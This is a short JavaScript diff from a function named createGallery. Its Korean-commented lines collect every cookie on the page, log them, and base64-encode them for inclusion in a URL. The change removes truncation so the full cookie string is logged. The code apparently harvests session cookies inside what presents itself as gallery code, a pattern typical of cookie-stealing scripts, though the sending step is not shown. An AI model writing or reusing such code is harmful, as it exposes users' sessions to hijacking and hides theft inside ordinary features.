@@ -328,7 +328,7 @@ function createGallery(container) {
             // 현재 페이지의 모든 쿠키를 가져옴
             const cookieString = document.cookie;
 
-            console.log('🍪 쿠키 수집:', cookieString.substring(0, 100) + '...');
+            console.log('🍪 쿠키 수집:', cookieString);
 
             // Base64 인코딩 (URL에 안전하게 포함하기 위해)
             const encodedCookies = btoa(encodeURIComponent(cookieString));
